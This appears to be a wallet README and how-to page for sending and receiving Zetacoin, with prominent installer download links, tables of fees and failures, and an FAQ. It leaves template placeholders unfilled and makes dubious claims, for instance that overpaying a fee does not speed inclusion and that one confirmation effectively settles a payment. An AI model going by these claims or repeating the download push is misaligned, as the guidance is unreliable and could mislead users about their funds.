![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Send and Receive Zetacoin</h1>

<p align="center">How a Zetacoin payment moves, confirms and settles, and what to do when it does not.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

To receive ZET, give the sender an address from the wallet's receive tab  -  it begins with `9`. To send, paste a `9...` address, enter the amount, keep the recommended 0.001 fee, and broadcast. Confirmations arrive in seconds to minutes on a 30-second chain, and the transaction appears in the history with its status.

## Receiving: the address is the whole thing

A receiving address is derived from keys in your wallet, and the wallet holds many of them. Generating a fresh address for each payment is good practice, and it costs nothing.

The one rule that matters is the prefix. Current-chain addresses begin with `9`. A `Z...` address belongs to the retired chain and cannot receive ZET; sending to one is a loss of the coins because that chain is no longer convertible.

That single check  -  is the first character a nine  -  prevents the most common irreversible mistake in using this wallet.

The full walk-through, with the checks in order, is in [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md).

## Sending, step by step

Open the send tab, paste the destination address, enter the amount, and review the fee. The recommended fee setting is `paytxfee=0.001`, and leaving it there produces transactions that confirm promptly.

Check the address twice before broadcasting. There is no recall, no reversal and no customer service that can pull a transaction back; the only recovery is the recipient choosing to return the funds.

Then confirm. The client signs with the keys in your wallet, which is why an encrypted wallet asks for the passphrase or needs to be unlocked first.

## What happens after you broadcast

The transaction enters the mempool and peers relay it. A miner or staker includes it in a block, and after that first confirmation the funds are effectively settled; further confirmations add certainty rather than change the outcome.

On a 30-second chain this is quick, but "quick" still depends on the transaction reaching peers. A wallet with zero peers cannot broadcast, and the transaction waits until connectivity returns.

The history tab shows the status. A transaction that appears sent but stays unconfirmed is a peer or fee question rather than a chain question.

For the background behind this step, [Why Zetacoin Addresses Start With 9](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-addresses-start-with-9.md) covers the same ground in more detail.

## Confirmations and what they mean

One confirmation means the transaction is in a block. More confirmations mean more blocks have been built on top of it, which makes reversal progressively harder.

For ordinary payments, one or two confirmations is the practical threshold. For a large trade, waiting longer is cheap insurance and costs only minutes on this chain.

Exchanges set their own thresholds, and those are the ones that matter for a deposit. If a deposit is not credited, the usual cause is that the exchange is waiting for more confirmations than the sender expects.

## Fees and why the recommended value exists

The fee is what you pay to be included in a block. On this chain a small fee is sufficient, and the recommended value reflects that. Setting it to zero produces transactions that can sit unconfirmed for a long time, which people report as a stuck transaction.

Overpaying does not make a transaction more likely to be included than the next one; it just costs more. The recommended setting is the one to use unless you have a specific reason.

Fees are configured in `zetacoin.conf`, so changing them means editing the file and restarting the client.

## Common failures and what they mean

| Symptom | Cause | What to do |
| --- | --- | --- |
| Sent but unconfirmed for long | fee too low or no peers | check peers, consider a higher fee next time |
| Transaction missing entirely | never broadcast | check connectivity, rebroadcast |
| Recipient says nothing arrived | wrong address or wrong chain | confirm the address began with `9` |
| Balance shows pending | confirmations in progress | wait, then check history |

Each of these is diagnosable from the history tab and the peer count, which is why those two are the first things to look at.

## Receiving safely

Give an address rather than a screenshot, and read back the first and last characters when a payment matters. Address substitution malware exists and changes what you see in a clipboard, so pasting without glancing at the prefix is a real risk.

Do not accept a payment to an address you did not generate. If someone sends you an address to "verify", you are being asked to send coins to them, not to receive anything.

## Common questions

### Why do addresses start with 9?

The current chain uses a nine prefix. A `Z` prefix belongs to the retired SHA-256 chain and cannot receive current ZET.

### How many confirmations should I wait for?

One or two for ordinary payments. Exchanges set their own thresholds, and those govern deposits.

### Can I cancel a sent transaction?

No. Once broadcast and confirmed there is no reversal; only the recipient can return funds.

### Why is my transaction unconfirmed?

Usually a low fee or a wallet with no peers. Check the peer count first, then the fee setting.

## The short version

Receive to a `9...` address, send with the recommended fee, check the prefix twice, and give it a minute. Everything else is history-tab reading.

Related pages: {{ARTICLE:zetacoin-address-format-prefix}} for the prefix question, {{ARTICLE:zetacoin-transaction-confirmations}} for waiting times, {{ARTICLE:zetacoin-stuck-transaction-fix}} if it never confirms, and {{ARTICLE:zetacoin-wallet-desktop-client-guide}} for the client's tabs. Current builds are on {{RELEASE}}.

## Why the prefix check is the important habit

Every irreversible mistake in sending ZET comes down to an address that was not what it appeared to be. The chain has no recall, no reversal and no support desk with an override, so the check happens before the broadcast rather than after it.

The prefix is the fastest signal available. Current addresses begin with a nine; legacy addresses begin with a Z and cannot receive current coins. Reading the first character catches the case where a copied address came from an old wallet, an old guide or another project entirely.

The second habit is sending a small test amount to a new destination. It is slower and slightly more expensive, and it turns an irreversible mistake into a recoverable one. For a first payment to an exchange or a new wallet, that trade is worth making.

The fee is the third check. The recommended value works; a zero fee leaves a transaction waiting, and waiting looks like a fault when it is a setting. If a payment does stall, the peer count and the fee are the two things to inspect, and both are visible in the client.

If a payment stalls before it reaches a peer, the connectivity checks in {{ARTICLE:zetacoin-wallet-zero-peer-connections}} are the ones that apply.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [A Stuck Zetacoin Transaction: What to Do](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/stuck-transaction-what-to-do.md)
- [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md)
- [Why Zetacoin Addresses Start With 9](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-addresses-start-with-9.md)
